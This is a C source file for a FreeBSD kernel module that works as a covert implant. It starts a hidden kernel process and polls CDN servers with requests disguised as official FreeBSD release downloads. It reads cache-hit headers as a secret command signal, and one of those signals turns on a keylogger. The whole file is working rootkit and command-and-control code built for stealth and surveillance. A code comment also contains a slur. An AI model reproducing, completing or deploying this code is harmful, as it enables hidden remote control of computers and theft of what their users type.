#include "shellproxy.h"
#include "profile.h"
#include <sys/sockopt.h>

#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
#  define DD_ENABLED 1
# endif
#endif

#define DD_BUCKET_SEC 20
#define DD_PATH "/ftp/releases/amd64/" PROFILE_RELEASE "/MANIFEST"

#ifdef DD_ENABLED

static struct proc *dd_proc;

static
int proxy_http (const char * edge, char kind, uint64_t bucket, int * hit)
{
	struct thread * td = curthread;

	if (hit!=NULL)
		*hit = 0;

	struct socket * so;
	if (socreate(AF_INET, &so, SOCK_STREAM, IPPROTO_TCP,
	    td->td_ucred, td)!=0)
		return (1);
	proxy_attr_socket(so);

	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_len = sizeof(sa);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(80);
	if (inet_aton(edge, &sa.sin_addr)==0) {
		soclose(so);
		return (1);
	}

	int error = soconnect(so, (struct sockaddr*)&sa, td);
	if (error!=0) {
		soclose(so);
		return (1);
	}

	for (int i=0; i<50; i++) {
		SOCK_LOCK(so);
		if (so->so_state&(SS_ISCONNECTED|SS_ISDISCONNECTED)) {
			int bad = !(so->so_state&SS_ISCONNECTED);
			SOCK_UNLOCK(so);
			if (bad) {
				soclose(so);
				return (1);
			}
			break;
		}
		SOCK_UNLOCK(so);
		if (i==49) {
			soclose(so);
			return (1);
		}
		tsleep(&so->so_timeo, PWAIT, "ddpoll", hz/20);
	}
	proxy_attr_socket(so);

	struct sockopt sopt;
	memset(&sopt, 0, sizeof(sopt));
	sopt.sopt_dir = SOPT_SET;
	sopt.sopt_level = SOL_SOCKET;
	sopt.sopt_name = SO_RCVTIMEO;
	struct timeval tv = { .tv_sec = 4 };
	sopt.sopt_val = &tv;
	sopt.sopt_valsize = sizeof(tv);
	(void)sosetopt(so, &sopt);

	char req[256];
	snprintf(req, sizeof(req),
	    "GET " DD_PATH "?ts=%llu&hmac=%016llx&%c HTTP/1.1\r\n"
	    "Host: download.freebsd.org\r\n"
	    "User-Agent: FreeBSD libfetch/2.1\r\n"
	    "Connection: close\r\n"
	    "\r\n",
	    (unsigned long long)bucket, (unsigned long long)DD_ID, kind);

	error = proxy_send_n(so, req, strlen(req));
	if (error!=0) {
		soclose(so);
		return (1);
	}

	char buf[2048];
	int total = 0;
	for (;;) {
		struct iovec iov;
		struct uio uio;
		size_t want;

		if (total>=(int)sizeof(buf)-1)
			break;
		want = sizeof(buf)-1-total;
		iov.iov_base = buf+total;
		iov.iov_len = want;
		uio.uio_iov = &iov;
		uio.uio_iovcnt = 1;
		uio.uio_offset = 0;
		uio.uio_resid = want;
		uio.uio_segflg = UIO_SYSSPACE;
		uio.uio_rw = UIO_READ;
		uio.uio_td = td;

		error = soreceive(so, NULL, &uio, NULL, NULL, 0);
		if (error!=0)
			break;
		if (uio.uio_resid==want)
			break;
		total += (int)(want-uio.uio_resid);
	}
	soclose(so);
	buf[total] = '\0';

	if (hit==NULL)
		return (0);
	// yeah i know this is so ugly we need to redo this soon
	// prob gonna install 30 single header libraries to parse reqs this is fucking retarded
	for (char* line=buf; line<buf+total; ) {
		char* end = strstr(line, "\r\n");
		char* next;

		if (end==NULL)
			break;
		next = end+2;
		if (strncasecmp(line, "x-cache:", 8)==0) {
			
			*hit = strcasestr(line, "HIT")!=NULL;
			break;
		}
		line = next;
	}

	return (0);
}

int proxy_http_any (char kind, uint64_t bucket, int * hit)
{
	int error = proxy_http(CDN1, kind, bucket, hit);

	if (error!=0)
		error = proxy_http(CDN2, kind, bucket, hit);
	return (error);
}

static
void dd_run (void* arg)
{
	struct thread * td = curthread;
	struct proc * p = td->td_proc;
	uint64_t last_bucket = ~(uint64_t)0;
	int last_mfire = 0;
	int idle = 0;
	int interval;

	(void)arg;
	proxy_hide(p);

	while (!shutting_down) {
		uint64_t bucket = (uint64_t)time_second/DD_BUCKET_SEC;
		int hit;

		(void)proxy_http_any('p', bucket, NULL);
		if (arc4random_uniform(3)==0)
			pause("ddjit", hz/2 + arc4random_uniform(hz));
		(void)proxy_http_any('p', bucket+1, NULL);
		if (bucket!=last_bucket) {
			last_bucket = bucket;
			if (proxy_http_any('a', bucket, &hit)==0&&hit) {
#ifdef DBGMODEDONTUSEME
				printf("bucket is %llu\n", (unsigned long long)bucket);
#endif
				mtx_lock(&proxy_mtx);
				mfire++;
				mtx_unlock(&proxy_mtx);
				wakeup(&mfire);
			}
#ifdef DBGMODEDONTUSEME
			else
				printf("bucket is %llu hit %d\n", (unsigned long long)bucket, hit);
#endif
#ifdef CFG_KEYLOGGER
			if (proxy_http_any('k', bucket, &hit)==0&&hit) {
				keylog_until = time_uptime+300;
				mtx_lock(&proxy_mtx);
				mfire++;
				mtx_unlock(&proxy_mtx);
				wakeup(&mfire);
			}
#endif
		}

		if (mfire!=last_mfire) {
			last_mfire = mfire;
			idle = 0;
		} else if (idle<8) {
			idle++;
		}

		interval = 15 + idle + arc4random_uniform(7);
		tsleep(&dd_proc, PWAIT, "ddpoll", hz * interval);
	}

	proxy_unhide(p);
	mtx_lock(&proxy_mtx);
	kthreads_done++;
	wakeup(&kthreads_done);
	mtx_unlock(&proxy_mtx);
	kproc_exit(0);
}

int dd_start (void)
{
	return (kproc_create(dd_run, NULL, &dd_proc, 0, 4, "ddpoll"));
}

void dd_stop (void)
{
	wakeup(&dd_proc);
}

#else

int proxy_http_any (char kind, uint64_t bucket, int* hit)
{
	(void)kind; (void)bucket;
	if (hit!=NULL)
		*hit = 0;
	return (1);
}

int dd_start (void)
{
	return (0);
}

void dd_stop (void)
{
}

#endif
